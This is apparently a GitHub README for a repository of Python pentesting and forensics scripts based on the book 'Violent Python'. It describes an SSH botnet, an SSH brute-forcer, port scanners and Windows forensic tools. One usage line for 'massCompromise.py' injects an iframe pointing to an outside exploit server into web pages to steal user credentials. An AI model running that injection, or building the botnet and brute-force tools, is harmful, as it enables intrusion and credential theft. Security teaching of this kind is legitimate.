# Digital-Forensic-Analytics  
Forensic Investigation, Network Traffic Analysis, Penetration Testing, Antivirus Evasion, Web recon


These codes are almost similar to book: "Violent Python: A Cookbook for Hackers, Forensic Analysts, Penetration Testers and Security Engineers" book by TJ. O’Connor.  

## Operating System  
  
I Use virtualbox to setup a Ubuntu 18.04 LTS linux box to run these on  
The actual i have is Kali Linux 64 Bit 2018.2  
Window7 for few scripts  
  
Where possible i display all he codes with result Jupyter notebook (#FileFormat .ipynb)  
  
# Penetration Testing  
## PortScan.py  

In the command Line pass the port argument as a string i.e in " " for multiple port like follow;  
taymour:∼# python portScan.py -H 10.50.60.125 -p "21, 1720"  
  
## Nmap_Port_Scanner.py
Scan the ports on the provided hosts.

## D) SSH_Botnet.py
Issue commands on ssh hosts at once provided you have the user names and passwords.

## E) sshBrute.py
Brute forces a host's ssh server with a provided worldlist

## H) botNet.py
Change IP, Root, Password to issue SSH commands on compromised machines.

## I) anonLogin.py  
First you have to allow /etc/vsftpd.conf file to enable anon_login to yes or uncomment it  

## L) massCompromise.py  
In command line following options are required to attack web pages and inject your own html file to steal compromised user credentials in default location  
Usage from terminal      
taymour# python massCompromise.py -H 192.168.95.179 -r '<iframe src="  
http://10.10.10.112:8080/exploit"></iframe>' -f userpass.txt  

## M) discoverNetworks.py    
Allow to analyse connected wifi through mac adress by reading windows registry  
Usage from command prompt    
(py27) C:\Users\Taymour> python discoverNetworks.py -u <username> -p <password>  
  
## N) dumpRecycleBin.py  
  
Allows to discover deleted items in windows operating system ,also provide information about the user who delete files
